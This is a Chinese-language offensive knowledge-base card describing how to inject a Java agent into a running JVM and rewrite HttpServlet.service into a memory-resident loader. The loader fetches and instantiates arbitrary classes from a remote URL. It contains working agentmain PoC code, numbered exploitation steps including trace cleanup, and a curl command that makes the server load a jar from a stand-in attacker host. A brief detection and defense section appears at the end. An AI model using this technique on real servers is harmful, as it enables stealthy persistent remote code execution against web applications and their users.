---
id: web-java-classloader-agent-httpservlet-jar-loader
title: Java Attach Agent 改写 HttpServlet.service 为通用 Jar Loader：lUrl/lName 从远程加载并实例化任意类
type: scenario
domain: web
path: web/java/classloader
technique: java-agent-httpservlet-jar-loader
tags:
- java
- jvm
- attach-api
- instrumentation
- javassist
- classloader
- httpservlet
- memshell
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V273
  verified_at: '2026-11-07T23:19:19+08:00'
  notes: 已对照原文核对：AfterDemo.agentmain 匹配 javax/jakarta HttpServlet.service 与 WebLogic ServletStubImpl.execute、Javassist insertBefore、redefineClasses、lUrl/lName URLClassLoader 加载并 newInstance，以及图 01/03 的 /linject 与 jeecg-boot/sys/login 请求 200 空 body 均一致。与既有 web-java-classloader-attach-api-jvmti-agent-memory-shell 的区别成立（redefineClasses vs retransform；Jar Loader vs X-Token 命令执行）。未验证点：远程 jar 加载后的业务效果未在截图中展示（仅空 200）。
url: /docs/web/java/classloader/web-java-classloader-agent-httpservlet-jar-loader/
draft: false
kb_aliases:
- Jar Loader 内存注入
- Agent 改写 HttpServlet
- lUrl lName 远程类加载
- javax jakarta servlet 兼容
- WebLogic ServletStubImpl
- redefineClasses 注入
---

## 一句话结论

攻击者取得目标主机 Shell 且与 JVM 同 UID 后，可用 Attach API 加载 agent：`agentmain` 遍历已加载类，用 Javassist 在 `javax.servlet.http.HttpServlet.service`（或 `jakarta.*`、WebLogic `ServletStubImpl.execute`）方法入口插入一段“Jar Loader”字节码，再 `Instrumentation.redefineClasses` 生效；此后任意 Web 请求带上 `lUrl`/`lName` 参数，即可在 Web 应用上下文中用 `URLClassLoader` 从远程加载并 `newInstance()` 任意类，作为后续注入 Filter/其它内存马的通用加载器。

## 原理

- **Attach 与 agentmain**：外部进程通过 `VirtualMachine.attach(pid)` + `loadAgent(jar)` 把 agent 注入目标 JVM；agent JAR 的 MANIFEST 声明 `Agent-Class`，JVM 调用 `agentmain(String, Instrumentation)`。
- **target 选择**：`inst.getAllLoadedClasses()` 后按类名匹配常见 Servlet 入口：`javax.servlet.http.HttpServlet`/`jakarta.servlet.http.HttpServlet` 的 `service(ServletRequest,ServletResponse)`；WebLogic 则用 `weblogic.servlet.internal.ServletStubImpl.execute`。这些方法是所有 HTTP 请求的统一入口，改写一次即可全局触发。
- **字节码插入**：用 `ClassPool` + `ClassClassPath(targetClass)` 拿到目标类，`getDeclaredMethod("service", 参数类型)` 后 `insertBefore(shellCode)`；`$1`/`$2` 是 Javassist 对前两个方法参数的引用。`detach()` 后 `toBytecode()`，再 `inst.redefineClasses(new ClassDefinition(targetClass, bytes))` 替换已加载类的方法体。
- **Jar Loader 载荷**：在 `service` 入口检查请求（URI 或 query 含 `lPassword`/`linject` 等标记）；命中后从 `lUrl`、`lName` 读取 URL 与类名，`new URLClassLoader(new URL[]{new URL(lUrl)}, this.getClass().getClassLoader())` 加载 `lName`，打印其方法/构造器后 `clazz.newInstance()`，最后 `return` 跳过原 Servlet 逻辑（响应为空也作为注入成功的判断）。
- **父加载器与命名空间**：`URLClassLoader` 的父加载器设为当前 Web 应用类加载器，远程类才能看到 Web 应用中的 Spring/Servlet 类；同时类身份由“全限定名 + 定义它的类加载器”共同决定，同一 class 文件被不同 loader 加载会得到不同的 `Class` 对象，因此远程包名可与本地类重名而不冲突。
- **redefineClasses 与 retransformClasses**：`redefineClasses` 直接替换已加载类的方法体，不需要注册 Transformer；不能增删方法/字段。若目标环境限制 redefine 或类已被其它 agent 修改，可改用 `addTransformer(..., true)` + `retransformClasses` 的等价路径。
- **为何返回空**：`insertBefore` 插入的 `return` 使 `service` 直接结束，不调用原方法；攻击者以 HTTP 200/空 body 判断注入成功，且不破坏业务页面（只有带标记的请求进入加载逻辑）。

## 触发条件

- 攻击者已在目标主机获得 Shell，且与目标 JVM 同 UID（或 root/具备 ptrace 权限）；目标未设置 `-XX:+DisableAttachMechanism`。
- 目标为 Servlet 容器（Tomcat/Spring Boot/WebLogic 等），对应 Servlet 类已加载。
- Agent JAR 与依赖（javassist）可被目标 JVM 读取；远程 jar/class 可被目标访问（出网或内网可达）。
- 攻击者能向 Web 应用发请求，并知道/枚举到一个可达路径用于触发 `HttpServlet.service`。

## 利用步骤

1. 确认目标 JVM PID、用户与容器类型（`ps -ef | grep java`、访问任意 Web 路径确认 200）。
2. 准备 agent：`agentmain` 中匹配目标类，`insertBefore` Jar Loader 代码，`redefineClasses` 替换；打包 MANIFEST 声明 `Agent-Class`。
3. 用 Attach 工具（如 agent-attach-java）或自写 `VirtualMachine.attach/loadAgent` 注入，观察日志出现类名匹配与注入成功。
4. 把后续内存马（如 Filter 注射器）打包成 jar，放在攻击者 HTTP 服务上。
5. 请求 `POST /任意路径?lUrl=http://attacker/SpringFilter.jar&lName=org.example.Inject&lPassword`，触发远程类加载与 `newInstance()`，执行后续内存马注入。
6. 用业务请求验证内存马效果（如 JS 资源被重定向、特定参数命令执行），并清理 agent 痕迹。

## PoC

```java
// agentmain 核心
public static void agentmain(String args, Instrumentation inst) {
    ClassPool cp = ClassPool.getDefault();
    for (Class<?> cls : inst.getAllLoadedClasses()) {
        String n = cls.getName();
        if (!n.equals("javax.servlet.http.HttpServlet")
                && !n.equals("jakarta.servlet.http.HttpServlet")
                && !n.equals("weblogic.servlet.internal.ServletStubImpl")) continue;
        String method = n.startsWith("weblogic") ? "execute" : "service";
        String p1 = n.startsWith("jakarta") ? "jakarta.servlet.ServletRequest" : "javax.servlet.ServletRequest";
        String p2 = n.startsWith("jakarta") ? "jakarta.servlet.ServletResponse" : "javax.servlet.ServletResponse";
        try {
            cp.insertClassPath(new ClassClassPath(cls));
            CtClass cc = cp.get(n);
            CtMethod m = cc.getDeclaredMethod(method, new CtClass[]{cp.get(p1), cp.get(p2)});
            m.insertBefore(SHELL_CODE);   // 检查 lPassword/lUrl/lName 并 URLClassLoader.loadClass(lName).newInstance()
            cc.detach();
            inst.redefineClasses(new ClassDefinition(cls, cc.toBytecode()));
        } catch (Exception e) { e.printStackTrace(); }
    }
}
```

```bash
curl -X POST 'http://target:9091/linject?lUrl=http://attacker/TestSpring4.jar&lName=org.example.testspring4.Inject&password'
# HTTP/1.1 200，Set-Cookie: JSESSIONID=...，body 为空
```

## 变体与关联

- **WebLogic**：目标类改为 `weblogic.servlet.internal.ServletStubImpl` 的 `execute`；这是 WebLogic 的 Servlet 统一入口。
- **jakarta**：把载荷中的 `javax.servlet` 全部替换为 `jakarta.servlet`，否则类型转换失败。
- **redefine vs retransform**：现有 Attach+JVMTI 卡使用 `addTransformer + retransformClasses`；本卡用 `redefineClasses` 直接改方法体，二者都能达到改写 `service` 的效果。
- **后续利用**：Jar Loader 本身只是加载器，加载的类可以注册 Filter（见 [[web-java-component-tomcat-dynamic-filter-memshell]]）、监听器、Valve，或直接执行命令。
- 关联：[[web-java-classloader-attach-api-jvmti-agent-memory-shell]]（Agent 改写 HttpServlet 执行命令）、[[pentest-lateral-movement-java-attach-socket-container-injection]]（跨容器 Attach Socket 注入）。

## 检测与防御

- 监控 Attach 痕迹：`.attach_pid*`/`.java_pid*`、`SIGQUIT`、`loadAgent`、运行期出现新的 agent JAR 加载。
- 监控 `Instrumentation.redefineClasses/retransformClasses`、`HttpServlet.service` 字节码变化；用 Arthas/vmtool 等对已加载类做基线比对。
- 禁用不需要的 Attach：`-XX:+DisableAttachMechanism`；限制 JVM 进程 UID 与 ptrace 权限。
- 限制 Web 应用出网与远程类加载；监控请求参数中的 `lUrl`/`lName` 及异常 URLClassLoader 行为。
